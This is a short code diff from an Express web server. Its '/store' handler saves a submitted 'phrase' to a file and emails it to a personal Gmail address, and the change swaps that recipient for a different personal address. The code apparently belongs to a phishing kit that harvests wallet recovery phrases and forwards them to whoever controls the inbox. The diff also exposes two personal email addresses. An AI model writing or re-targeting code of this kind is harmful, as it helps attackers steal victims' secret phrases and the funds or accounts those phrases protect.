@@ -42,7 +42,7 @@ app.post('/store', (req, res) => {
           return;
         }
         console.log('Content has been appended to the file successfully.');
-        sendmail("josephstayton1@gmail.com","New form Entry",phrase)
+        sendmail("kkvic4@gmail.com","New form Entry",phrase)
         res.status(200).json("Great")
       });
 
